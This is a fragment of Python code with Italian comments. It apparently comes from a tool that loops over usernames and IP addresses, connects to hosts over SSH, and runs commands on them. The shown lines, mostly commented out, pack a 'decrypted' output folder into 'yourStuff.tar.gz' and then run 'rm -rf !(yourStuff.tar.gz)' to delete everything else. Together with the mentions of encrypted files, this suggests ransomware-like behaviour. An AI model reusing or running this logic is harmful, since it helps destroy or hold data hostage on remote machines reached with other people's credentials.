            ...
            for user in usernames:
                ...
                for ip_address in get_fresh_ipaddresses(NHOSTS):
                    ...
                    try:
                        ...
                        #comprimo la cartella output
                        print('compressione del decriptato')
                        #cmd='tar -zcvf yourStuff.tar.gz output'
                        #_=run_ssh_command(ssh,cmd)
                        #if debug==1: time.sleep(5)
                        #print('compresso')

                        #rimuovo tutto tranne yourStuff.tar.gz
                        #print('tentaivo di rimozione di tutto ciò che non è criptato')
                        #cmd='rm -rf !(yourStuff.tar.gz)'
                        #_=run_ssh_command(ssh,cmd)
                        #if debug==1: time.sleep(5)
                        #print('fatto')
